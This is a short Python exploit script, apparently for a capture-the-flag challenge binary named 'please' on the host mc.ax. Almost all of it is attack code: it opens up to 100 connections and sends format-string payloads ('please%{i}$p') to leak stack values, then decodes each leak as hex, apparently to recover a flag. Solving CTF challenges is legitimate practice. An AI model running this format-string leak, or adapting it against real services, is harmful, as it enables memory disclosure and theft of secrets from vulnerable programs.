#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from haxy import *
import subprocess
exe = context.binary = ELF('./please')

host = args.HOST or 'mc.ax'
port = int(args.PORT or 31569)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())
context.log_level = 'warn'
# -- Exploit goes here --
for i in range(100):
    try:
        io = start()
        re()
        sl(f"please%{i}$p")
        reu("please")
        leak = reu(" to").strip(b" to").decode('utf-8').strip("0x")
        print(leak)
        print(subprocess.check_output(["unhex", leak]))

    except :
        pass
        io.close()

